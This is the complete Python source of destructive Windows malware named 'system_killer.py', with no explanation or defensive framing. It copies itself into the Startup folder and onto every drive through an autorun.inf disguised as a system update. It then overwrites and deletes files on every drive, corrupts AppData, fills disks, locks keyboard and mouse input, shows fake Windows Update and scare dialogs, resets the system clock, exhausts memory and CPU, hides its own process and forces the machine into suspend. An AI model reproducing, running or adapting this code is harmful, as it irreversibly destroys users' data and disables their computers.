import os
import subprocess
import random
import threading
import time
import shutil
import socket

def setup_autorun():
    try:
        current_file = os.path.abspath(__file__)
        startup_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        dest_file = os.path.join(startup_folder, "system_killer.py")
        shutil.copyfile(current_file, dest_file)
        drives = [f"{chr(d)}:\\" for d in range(67, 90) if os.path.exists(f"{chr(d)}:\\")]
        for drive in drives:
            try:
                shutil.copyfile(current_file, os.path.join(drive, "system_killer.py"))
                with open(os.path.join(drive, "autorun.inf"), "w") as f:
                    f.write("[autorun]\nopen=system_killer.py\naction=Run System Update")
            except:
                continue
    except:
        pass

def rename_files_and_folders():
    user_dirs = [
        os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\Downloads")
    ]
    for dir_path in user_dirs:
        try:
            for root, dirs, files in os.walk(dir_path, topdown=False):
                for file in files:
                    try:
                        file_path = os.path.join(root, file)
                        new_name = os.path.join(root, "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=10)) + ".txt")
                        os.rename(file_path, new_name)
                    except:
                        continue
                for dir in dirs:
                    try:
                        dir_path = os.path.join(root, dir)
                        new_dir_name = os.path.join(root, "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=10)))
                        os.rename(dir_path, new_dir_name)
                    except:
                        continue
        except:
            continue

def destroy_user_files():
    drives = [f"{chr(d)}:\\" for d in range(67, 90) if os.path.exists(f"{chr(d)}:\\")]
    for drive in drives:
        try:
            for root, dirs, files in os.walk(drive, topdown=False):
                for file in files:
                    try:
                        file_path = os.path.join(root, file)
                        with open(file_path, "wb") as f:
                            f.write(os.urandom(1024 * 1024 * 2))
                        os.remove(file_path)
                    except:
                        continue
                for dir in dirs:
                    try:
                        dir_full_path = os.path.join(root, dir)
                        os.rmdir(dir_full_path)
                    except:
                        continue
        except:
            continue

def create_fake_files():
    try:
        sensitive_names = ["passwords.txt", "bank_info.doc", "secret_plans.pdf", "private_keys.txt"]
        desktop = os.path.expanduser("~\\Desktop")
        for i in range(50):
            fake_file = os.path.join(desktop, random.choice(sensitive_names).replace(".txt", f"_{i}.txt"))
            with open(fake_file, "w") as f:
                f.write("This is a fake file! Your system is compromised!")
    except:
        pass

def fake_update_window():
    try:
        subprocess.run('powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(\'Windows Update Required! Click OK to install critical updates.\', \'Windows Update\', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning); while($true) { Start-Sleep -Seconds 1 }"', shell=True)
    except:
        pass

def corrupt_system_files():
    try:
        system_paths = [
            os.path.expanduser("~\\AppData\\Local"),
            os.path.expanduser("~\\AppData\\Roaming")
        ]
        for path in system_paths:
            for root, dirs, files in os.walk(path, topdown=False):
                for file in files:
                    try:
                        file_path = os.path.join(root, file)
                        with open(file_path, "wb") as f:
                            f.write(os.urandom(1024 * 1024))
                    except:
                        continue
    except:
        pass

def broadcast_message():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        message = "WARNING: This system is infected! All data will be destroyed!".encode()
        for i in range(10):
            s.sendto(message, ('255.255.255.255', 12345))
            time.sleep(1)
        s.close()
    except:
        pass

def corrupt_browser_cache():
    try:
        browser_cache = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache")
        if os.path.exists(browser_cache):
            for i in range(1000):
                with open(os.path.join(browser_cache, f"junk_{i}.tmp"), "wb") as f:
                    f.write(os.urandom(1024 * 1024))
    except:
        pass

def change_wallpaper():
    try:
        black_img = "C:\\black_screen.bmp"
        with open(black_img, "wb") as f:
            f.write(b'\x42\x4D\x36\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
        subprocess.run(f'reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "{black_img}" /f', shell=True)
        subprocess.run("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", shell=True)
    except:
        pass

def lock_input():
    try:
        while True:
            subprocess.run("powershell (Add-Type '[DllImport(\"user32.dll\")]public static extern bool BlockInput(bool fBlockIt);' -Name a -Pas)::BlockInput(1)", shell=True)
            time.sleep(5)
            subprocess.run("powershell (Add-Type '[DllImport(\"user32.dll\")]public static extern bool BlockInput(bool fBlockIt);' -Name a -Pas)::BlockInput(0)", shell=True)
            time.sleep(1)
    except:
        pass

def spam_browser():
    while True:
        try:
            urls = ["https://www.example.com", "https://www.google.com", "https://www.youtube.com"]
            subprocess.run(f"start {random.choice(urls)}", shell=True)
            time.sleep(0.5)
        except:
            continue

def annoy_with_beep():
    while True:
        try:
            subprocess.run("powershell [console]::beep(500, 500)", shell=True)
            time.sleep(0.1)
        except:
            continue

def delete_shortcuts():
    try:
        desktop = os.path.expanduser("~\\Desktop")
        for file in os.listdir(desktop):
            if file.endswith(".lnk"):
                os.remove(os.path.join(desktop, file))
    except:
        pass

def mess_with_datetime():
    try:
        subprocess.run("powershell Set-Date -Date '01/01/1970'", shell=True)
    except:
        pass

def show_scary_message():
    try:
        subprocess.run('powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(\'Your system is destroyed! All your files are gone!\', \'WARNING\', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)"', shell=True)
    except:
        pass

def eat_memory():
    while True:
        try:
            _ = bytearray(1024 * 1024 * 300)
        except:
            continue

def kill_cpu():
    while True:
        try:
            _ = sum(random.randint(0, 1000000) ** 4 for _ in range(3000))
        except:
            continue

def spawn_chaos():
    programs = ["notepad.exe", "calc.exe", "mspaint.exe"]
    while True:
        try:
            subprocess.Popen(random.choice(programs), shell=True)
            time.sleep(0.05)
        except:
            continue

def fill_disk():
    try:
        drives = [f"{chr(d)}:\\" for d in range(67, 90) if os.path.exists(f"{chr(d)}:\\")]
        for drive in drives:
            for i in range(1000):
                file_path = os.path.join(drive, f"trash_{random.randint(1000, 9999)}_{i}.tmp")
                with open(file_path, "wb") as f:
                    f.write(os.urandom(1024 * 1024 * 10))
    except:
        pass

def turn_off_screen():
    while True:
        try:
            subprocess.run("powershell (Add-Type '[DllImport(\"user32.dll\")]public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)", shell=True)
            time.sleep(1)
        except:
            pass

def shutdown_system():
    try:
        subprocess.run("powershell Start-Sleep -s 10; (Add-Type '[DllImport(\"powrprof.dll\")]public static extern bool SetSuspendState(bool hibernate, bool forceCritical, bool disableWakeEvent);' -Name a -Pas)::SetSuspendState(0,1,0)", shell=True)
    except:
        pass

def hide_process():
    try:
        subprocess.run("powershell Start-Process -WindowStyle Hidden -FilePath \"" + os.path.abspath(__file__) + "\"", shell=True)
    except:
        pass

if __name__ == "__main__":
    hide_process()
    setup_autorun()
    threads = (
        [threading.Thread(target=rename_files_and_folders, daemon=True) for _ in range(5)] +
        [threading.Thread(target=destroy_user_files, daemon=True) for _ in range(10)] +
        [threading.Thread(target=create_fake_files, daemon=True) for _ in range(1)] +
        [threading.Thread(target=fake_update_window, daemon=True) for _ in range(1)] +
        [threading.Thread(target=corrupt_system_files, daemon=True) for _ in range(2)] +
        [threading.Thread(target=broadcast_message, daemon=True) for _ in range(1)] +
        [threading.Thread(target=corrupt_browser_cache, daemon=True) for _ in range(1)] +
        [threading.Thread(target=change_wallpaper, daemon=True) for _ in range(1)] +
        [threading.Thread(target=lock_input, daemon=True) for _ in range(1)] +
        [threading.Thread(target=spam_browser, daemon=True) for _ in range(5)] +
        [threading.Thread(target=annoy_with_beep, daemon=True) for _ in range(1)] +
        [threading.Thread(target=delete_shortcuts, daemon=True) for _ in range(1)] +
        [threading.Thread(target=mess_with_datetime, daemon=True) for _ in range(1)] +
        [threading.Thread(target=show_scary_message, daemon=True) for _ in range(1)] +
        [threading.Thread(target=eat_memory, daemon=True) for _ in range(30)] +
        [threading.Thread(target=kill_cpu, daemon=True) for _ in range(30)] +
        [threading.Thread(target=spawn_chaos, daemon=True) for _ in range(20)] +
        [threading.Thread(target=fill_disk, daemon=True) for _ in range(2)] +
        [threading.Thread(target=turn_off_screen, daemon=True) for _ in range(1)]
    )
    for thread in threads:
        thread.start()
    time.sleep(20)
    shutdown_system()